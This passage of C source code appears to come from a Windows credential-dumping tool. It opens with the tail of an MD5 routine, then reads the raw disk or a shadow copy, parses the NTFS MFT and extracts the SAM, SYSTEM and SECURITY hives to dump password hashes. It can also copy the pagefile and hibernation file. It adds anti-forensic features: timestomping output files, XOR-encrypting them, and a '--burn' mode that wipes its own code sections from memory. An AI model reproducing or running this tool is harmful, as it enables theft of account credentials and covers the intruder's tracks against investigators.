    HH(a,b,c,d,x[13], 4,0x289b7ec6); HH(d,a,b,c,x[ 0],11,0xeaa127fa); HH(c,d,a,b,x[ 3],16,0xd4ef3085); HH(b,c,d,a,x[ 6],23,0x04881d05);
    HH(a,b,c,d,x[ 9], 4,0xd9d4d039); HH(d,a,b,c,x[12],11,0xe6db99e5); HH(c,d,a,b,x[15],16,0x1fa27cf8); HH(b,c,d,a,x[ 2],23,0xc4ac5665);
    II(a,b,c,d,x[ 0], 6,0xf4292244); II(d,a,b,c,x[ 7],10,0x432aff97); II(c,d,a,b,x[14],15,0xab9423a7); II(b,c,d,a,x[ 5],21,0xfc93a039);
    II(a,b,c,d,x[12], 6,0x655b59c3); II(d,a,b,c,x[ 3],10,0x8f0ccc92); II(c,d,a,b,x[10],15,0xffeff47d); II(b,c,d,a,x[ 1],21,0x85845dd1);
    II(a,b,c,d,x[ 8], 6,0x6fa87e4f); II(d,a,b,c,x[15],10,0xfe2ce6e0); II(c,d,a,b,x[ 6],15,0xa3014314); II(b,c,d,a,x[13],21,0x4e0811a1);
    II(a,b,c,d,x[ 4], 6,0xf7537e82); II(d,a,b,c,x[11],10,0xbd3af235); II(c,d,a,b,x[ 2],15,0x2ad7d2bb); II(b,c,d,a,x[ 9],21,0xeb86d391);
    state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
}
static void MD5(const BYTE *data, size_t len, BYTE *out) {
    MD5_CTX ctx; MD5Init(&ctx); MD5Update(&ctx, data, len); MD5Final(out, &ctx);
}

/* ==================== UTILS ==================== */
static void XorCrypt(BYTE *data, DWORD len, const char *key) {
    uint32_t seed = 0;
    for (size_t i = 0; key[i]; i++) seed = seed * 31 + (BYTE)key[i];
    for (DWORD i = 0; i < len; i++) {
        seed = seed * 1103515245 + 12345;
        data[i] ^= (BYTE)((seed >> 16) & 0xFF);
    }
}

static void TimestompFile(const wchar_t *path) {
    HANDLE h = CreateFileW(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    FILETIME ft;
    ft.dwLowDateTime = 0xD53E8000;
    ft.dwHighDateTime = 0x01BF53E;
    SetFileTime(h, &ft, &ft, &ft);
    CloseHandle(h);
}

static void WriteFileWithKey(const wchar_t *name, BYTE *data, DWORD size, const char *key) {
    if (!data || !size) return;
    if (key) XorCrypt(data, size, key);
    HANDLE h = CreateFileW(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, data, size, &w, NULL);
    CloseHandle(h);
    if (key) XorCrypt(data, size, key);
    TimestompFile(name);
    wprintf(L"[+] Wrote %s (%u bytes)%s\n", name, size, key ? L" [encrypted]" : L"");
}

static void SelfDestruct(void) {
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) return;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0 || strcmp((char*)sec[i].Name, ".rdata") == 0) {
            BYTE *start = (BYTE*)hMod + sec[i].VirtualAddress;
            DWORD sz = sec[i].Misc.VirtualSize;
            DWORD old;
            VirtualProtect(start, sz, PAGE_EXECUTE_READWRITE, &old);
            memset(start, 0, sz);
            VirtualProtect(start, sz, old, &old);
        }
    }
}

/* ==================== MAIN ==================== */
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);   /* unbuffered: live output when redirected */
    int argc = 0;
    wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    int modeHives = 0, modeHashes = 0, modeMft = 0, modeMemory = 0, modeBurn = 0;
    int modePagefile = 0, modeHiberfil = 0, modeVss = 0;
    const char *key = NULL;

    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--hives") == 0) modeHives = 1;
        else if (wcscmp(argv[i], L"--hashes") == 0) modeHashes = 1;
        else if (wcscmp(argv[i], L"--mft") == 0) modeMft = 1;
        else if (wcscmp(argv[i], L"--memory") == 0) modeMemory = 1;
        else if (wcscmp(argv[i], L"--burn") == 0) modeBurn = 1;
        else if (wcscmp(argv[i], L"--pagefile") == 0) modePagefile = 1;
        else if (wcscmp(argv[i], L"--hiberfil") == 0) modeHiberfil = 1;
        else if (wcscmp(argv[i], L"--vss") == 0) modeVss = 1;
        else if (wcscmp(argv[i], L"--key") == 0 && i + 1 < argc) {
            static char keyBuf[64];
            wcstombs(keyBuf, argv[++i], 63);
            key = keyBuf;
        }
    }
    if (!modeHives && !modeHashes && !modeMft && !modePagefile && !modeHiberfil)
        modeHashes = 1;

    PrintBanner();

    if (!IsUserAnAdmin()) {
        wprintf(L"[-] Administrator privileges required for raw disk access.\n");
        return 1;
    }

    wprintf(L"[*] Initializing...\n");

    if (modeVss) {
        if (!TryVSS()) {
            wprintf(L"[-] VSS mode failed.\n");
            return 1;
        }
    } else {
        if (!OpenPhysicalDrive(0)) {
            wprintf(L"[-] PhysicalDrive0 failed, trying VSS fallback...\n");
            if (!TryVSS()) {
                wprintf(L"[-] All disk access methods failed.\n");
                return 1;
            }
        }
    }

    if (!FindNtfsPartition()) {
        wprintf(L"[-] No NTFS partition found.\n");
        return 1;
    }

    wprintf(L"[+] NTFS partition at offset 0x%llX, cluster=%u, MFT record=%u\n",
            g_partitionOffset, g_clusterSize, g_mftRecordSize);

    if (!ReadMftIntoMemory()) {
        wprintf(L"[-] Failed to read MFT.\n");
        return 1;
    }

    wprintf(L"[*] Building file tree from %llu MFT records...\n", g_mftRecordCount);
    BuildFileTree();
    wprintf(L"[+] File tree: %d entries\n", g_entryCount);

    uint64_t recSam = 0, recSys = 0, recSec = 0;
    if (!ResolvePath(L"Windows\\System32\\config\\SAM", &recSam)) {
        wprintf(L"[-] SAM not found in MFT.\n"); return 1;
    }
    if (!ResolvePath(L"Windows\\System32\\config\\SYSTEM", &recSys)) {
        wprintf(L"[-] SYSTEM not found in MFT.\n"); return 1;
    }
    if (!ResolvePath(L"Windows\\System32\\config\\SECURITY", &recSec)) {
        wprintf(L"[-] SECURITY not found in MFT.\n"); return 1;
    }

    BYTE *samBuf = NULL, *sysBuf = NULL, *secBuf = NULL;
    DWORD samSize = 0, sysSize = 0, secSize = 0;

    wprintf(L"[*] Extracting hives...\n");
    ExtractFileByRecord(recSam, &samBuf, &samSize);
    ExtractFileByRecord(recSys, &sysBuf, &sysSize);
    ExtractFileByRecord(recSec, &secBuf, &secSize);
    wprintf(L"[+] SAM=%u SYSTEM=%u SECURITY=%u bytes\n", samSize, sysSize, secSize);

    if (modeHashes && samBuf && sysBuf) {
        HIVE hSam = {samBuf, samSize};
        HIVE hSys = {sysBuf, sysSize};
        if (!ExtractSamUsers(&hSam, &hSys))
            wprintf(L"[-] SAM hash extraction failed\n");
    }

    if (modeHives && !modeMemory) {
        WriteFileWithKey(L"SAM", samBuf, samSize, key);
        WriteFileWithKey(L"SYSTEM", sysBuf, sysSize, key);
        WriteFileWithKey(L"SECURITY", secBuf, secSize, key);
    }

    if (modeMft && !modeMemory) {
        BYTE *mftData = NULL; DWORD mftSz = 0;
        ExtractFileByRecord(0, &mftData, &mftSz);
        WriteFileWithKey(L"$MFT", mftData, mftSz, key);
        free(mftData);
    }

    uint64_t recPf = 0, recHib = 0;
    if ((modePagefile || modeHiberfil) && !modeMemory) {
        if (modePagefile && FindEntryByParentAndName(5, L"pagefile.sys") >= 0) {
            uint64_t r = g_entries[FindEntryByParentAndName(5, L"pagefile.sys")].recordNumber;
            BYTE *b = NULL; DWORD s = 0;
            ExtractFileByRecord(r, &b, &s);
            WriteFileWithKey(L"pagefile.sys", b, s, key);
            free(b);
        }
        if (modeHiberfil && FindEntryByParentAndName(5, L"hiberfil.sys") >= 0) {
            uint64_t r = g_entries[FindEntryByParentAndName(5, L"hiberfil.sys")].recordNumber;
            BYTE *b = NULL; DWORD s = 0;
            ExtractFileByRecord(r, &b, &s);
            WriteFileWithKey(L"hiberfil.sys", b, s, key);
            free(b);
        }
    }

    free(samBuf); free(sysBuf); free(secBuf);
    free(g_mftBuffer); free(g_entries);
    CloseHandle(g_hDisk);

    if (modeBurn) {
        wprintf(L"[*] Burning the evidence...\n");
        SelfDestruct();
    }

    wprintf(L"[+] Done.\n");
    LocalFree(argv);
    return 0;
}
